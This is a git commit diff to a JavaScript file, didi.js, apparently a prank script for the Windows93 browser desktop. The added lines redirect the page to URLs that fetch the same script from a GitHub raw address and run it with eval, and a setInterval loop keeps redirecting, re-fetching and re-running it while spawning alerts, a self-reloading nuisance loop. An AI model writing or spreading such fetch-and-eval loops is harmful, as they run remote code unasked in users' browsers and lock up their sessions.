25fa894e9d4d33d88c5af44e22de09b624392481
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2024-12-27 21:25:07 +0300

    Update didi.js

--- didi.js
+++ didi.js
@@ -1,3 +1,4 @@
+window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/didi.js').then(response => response.text()).then(script => eval(script));"
 $alert({
     msg: "<img src='https://raw.githubusercontent.com/ivorydevrimoalt/windows93/refs/heads/main/diditron.png' height=150>",
     title: "Didi",
@@ -7,6 +8,11 @@ $alert({
     img: "https://raw.githubusercontent.com/ivorydevrimoalt/windows93/refs/heads/main/diditron.png",
     onok: () => {
 setInterval(function(){
+window.location.href = "https://www.windows93.net/#!hampster"
+window.location.href = "https://www.windows93.net/#!hydra"
+window.location.href = "www.windows93.net/#!3d%20'Didi'"
+window.location.href = "https://www.windows93.net/#!pd"
+window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/didi.js').then(response => response.text()).then(script => eval(script));"
 $notif("Didi")
 $alert({
     msg: "<img src='https://raw.githubusercontent.com/ivorydevrimoalt/windows93/refs/heads/main/diditron.png' height="+ (Math.random() * 250) +">",
